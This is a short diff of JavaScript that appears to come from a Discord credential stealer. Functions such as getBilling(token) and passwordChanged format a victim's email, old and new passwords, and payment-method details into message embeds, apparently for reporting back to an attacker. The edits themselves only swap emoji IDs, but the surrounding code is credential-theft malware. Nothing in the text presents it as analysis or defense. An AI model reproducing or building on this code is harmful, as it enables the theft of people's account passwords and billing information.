@@ -502,7 +502,7 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:1716_PAYPAL:1232495926455566427> ';
           break;
       }
     }
@@ -697,7 +697,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:password:1232100660258934825> Old Password: **${oldpassword}**\n<:password:1232100660258934825> New Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:old:1232496419949252608> Old Password: **${oldpassword}**\n<:password:1232100660258934825> New Password: **${newpassword}**`,
             inline: true,
           },
           {
